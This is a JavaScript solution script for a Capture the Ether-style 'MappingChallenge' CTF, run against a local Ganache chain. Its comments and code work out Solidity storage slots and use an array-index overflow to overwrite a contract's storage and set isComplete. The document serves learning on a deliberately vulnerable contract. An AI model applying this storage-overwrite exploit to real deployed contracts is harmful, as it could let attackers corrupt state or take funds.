/**
 * INSTRUCTIONS
 *
 * 1. Using Ganache on this one. Changed the port in truffle-config and the existing mnemonic (though I would
 * have some nice storage dumps but not really...).
 * 2. Run migration in development and re-execute all the steps: `truffle migrate --reset`: (cd 4_mapping_local && truffle migrate --reset)
 * 3. Copy challenge recently created contract address to the variable below.
 * 4. Good to go.
 *
 * References:
 * Slots, dynamic arrays, etc.
 * https://docs.soliditylang.org/en/v0.8.9/internals/layout_in_storage.html
 * https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
 *
 * SOLUTION
 *
 * Our local MappingChallenge (slightly different than the one from capturetheether) has:
 * Slot 0: uint256 test
 * Slot 1: bool isComplete
 * Slot 2: uint256[] map (which actually saves the array length).
 *
 * A keccak256 hash of the slot as the address where the value is stored, in this case keccak256(2)
 * will give us the starting array address.
 *
 * When we speak about slots we're actually saying that slot 0 lives in 0x00...00, slot 1 in 0x00..01
 * and so on. So given that we have direct access to memory addresses we just have to find the address
 * that will overflow and wrap so it coincides with slot0, slot1, etc.
 *
 * Some reference addresses we've found to have a more visual approach:
 * "0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace"    // keccak(2), that is of slot 2
 * "0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532";   // slot 0
 * "0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a533";   // slot 1
 * "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe";   // 2n ** 256n - 2n
 *
 * 2**256 is such a huge range that the chances of addresses overlap is close to zero. Still, that doesn't
 * mean we can't actually calculate the pointer/addresses... The equation we'll use basically tries to find
 * the index we need to pass to the array to overflow and match slot0, slot1, etc. Remember overflow will happen
 * on 2**256
 *
 * Slot 0:
 *     keccak(2) + index = 2**256 <=>
 * <=> index = 2**256 - keccak(2)
 *
 * Btw, we have to expand the array to a value high enough so that the index needed to overflow/wrap
 * is actually used and value written. To be more specific, something higher than 0xbf...532 will be
 * enough but to simplify we just use the maximum index possible: 2**256 - 2 (2 instead of 1 because of
 * map.length = key + 1).
 *
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js');

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:7545",
});

const web3 = new Web3(provider);

const challengeAbi = JSON.parse(
  fs.readFileSync(
    "./4_mapping_local/build/contracts/MappingChallenge.json"
  )
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const challengeContractAddress = "0x0Fcd57fF23578279e71a3eFADBF79feD93f6C373";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    const challengeContract = new web3.eth.Contract(
      challengeAbi,
      challengeContractAddress
    );
    const gasPrice = await web3.eth.getGasPrice();
    let res;

    /**
     * web3.utils.soliditySha3 is equivalent to Web3Utils.keccak256
     */
    const dynamicArrayPointer = web3.utils.soliditySha3(
      `0x0000000000000000000000000000000000000000000000000000000000000002`      // slot 2
    );

    console.log(dynamicArrayPointer)        // 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace

    const expandArrayKey = 2n ** 256n - 2n; // 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe

    res = await challengeContract.methods
      .set(expandArrayKey, 9)
      .send({ from: user, gasPrice })

    console.log(res);

    challengeContract.methods
      .get(expandArrayKey)
      .call()
      .then(console.log);

    const overflowKey = 2n ** 256n - BigInt(dynamicArrayPointer);  // hex: 0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532

    res = await challengeContract.methods
      .set(overflowKey, 5)
      .send({ from: user, gasPrice })

    console.log(res);

    const x = await challengeContract.methods
      .get(overflowKey)
      .call();

    const y = await challengeContract.methods
      .test()
      .call();

    // x and y will have the same value
    console.log(x, y, x === y);

    // let's set isComplete to true now
    res = await challengeContract.methods
      .set(overflowKey + 1n, 1)
      .send({ from: user, gasPrice })

    console.log(res);

    challengeContract.methods
      .isComplete()
      .call()
      .then(console.log);
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
